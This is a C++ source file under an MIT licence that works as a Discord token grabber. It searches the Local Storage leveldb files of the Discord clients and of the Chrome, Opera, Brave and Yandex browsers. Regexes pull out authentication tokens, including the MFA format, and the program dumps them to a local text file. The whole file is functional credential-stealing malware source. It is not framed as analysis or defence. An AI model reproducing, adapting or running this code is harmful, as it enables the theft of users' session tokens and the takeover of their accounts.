#include <map>
#include <iostream>
#include <cstdlib>
#include <string>
#include <regex>
#include <fstream>
#include <vector>
#include <filesystem>
using namespace std;

map<string, string> paths{};
vector<string> tokens;

bool findbyregex(string line = "") {
    if (line != "") {
        try {
            auto rxnormal = regex(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
            auto rxmfa = regex(R"(mfa\.[\w-]{84})");
            smatch tkn{};
            string token;
            if (regex_search(line, tkn, rxnormal)) {
                token = tkn.str();
                tokens.push_back(token);
            }
            if (regex_search(line, tkn, rxmfa)) {
                token = tkn.str();
                tokens.push_back(token);
            }
            line.clear();
        } catch (exception& e) {
            return 1;
        }
        return 0;
    } else return 1;
}

void readfortokens(string filepath = "") {
    if (filepath != "") {
        streampos size;
        char * contentch;
        ifstream f(filepath, ios::binary);
        if (f.is_open()) {
            f.seekg(0, ios::end);
            size = f.tellg();
            contentch = new char[size];
            f.seekg(0, ios::beg);
            f.read(contentch, size);
            f.close();
        } else return;
        string contentstr(contentch, size);
        delete[] contentch;
        findbyregex(contentstr);
        contentstr.clear();
    } else return;
}

void findtokens(string path) {
    path += "\\Local Storage\\leveldb";
    filesystem::directory_iterator pathiterator;
    try {
        pathiterator = filesystem::directory_iterator(path);
    } catch (exception& e) {
        return;
    }
    for (const auto & entry : pathiterator) {
        string pathstr{entry.path().string()};
        if (pathstr.find(".log") == -1 && pathstr.find(".ldb") == -1 ) {
            continue;
        } else {
            readfortokens(pathstr);
        }
    }
}

void makepaths() {
    string local;
    string roaming;
    try {
        local = getenv("localappdata");
        roaming = getenv("appdata");
    }
    catch (exception& e) {
        return;
    }
    paths.insert({
        {"Discord", roaming + "\\Discord"},
        {"DiscordCan", roaming + "\\discordcanary"},
        {"DiscordPTB", roaming + "\\discordptb"},
        {"Opera", roaming + "\\Opera Software\\Opera Stable"},
        {"Chrome", local + "\\Google\\Chrome\\User Data\\Default"},
        {"Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
        {"Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default"}
        });
}

int main() {
    makepaths();
    for (auto& path : paths) {
        findtokens(path.second);
    }
    if (tokens.size() > 0) {
        string tokensall;
        for (int ctoken = 0; ctoken <= (tokens.size() - 1); ctoken++) {
            string token = tokens[ctoken];
            tokensall.append(token + "\n");
        }
        try {
            ofstream outfile(".\\tokendump.txt");
            if (outfile.is_open()) {
                outfile << tokensall;
                outfile.close();
            }
        } catch (...) {
            cerr << "";
        }
    }
    return 0;
}

/*
MIT License

Copyright (c) 2021 NK125

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
